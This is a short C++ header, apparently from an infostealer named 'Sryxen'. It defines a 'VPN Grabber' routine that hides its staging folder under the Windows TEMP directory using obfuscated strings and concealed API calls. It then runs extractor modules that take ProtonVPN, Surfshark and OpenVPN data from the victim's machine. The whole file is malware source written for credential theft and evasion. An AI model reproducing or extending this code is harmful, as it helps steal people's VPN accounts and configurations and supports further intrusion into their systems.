#ifndef ENTRYPOINT_VPN_HPP
#define ENTRYPOINT_VPN_HPP

#include "Proton.hpp"
#include "Surfshark.hpp"
#include "OpenVPN.hpp"

namespace VPN {
    inline void Extract() {
        DEBUG_PRINT(L"VPN Grabber Started");
        std::string vpnDir = std::string(getenv("TEMP")) + OBF("\\Sryxen\\VPN");
        HiddenCalls::CreateDirectoryA(vpnDir.c_str(), NULL);
        ProtonVPN::Extract(vpnDir);
        Surfshark::Extract(vpnDir);
        OpenVPN::Extract(vpnDir);
        DEBUG_PRINT(L"VPN Grabber Finished");
    }
}

#endif
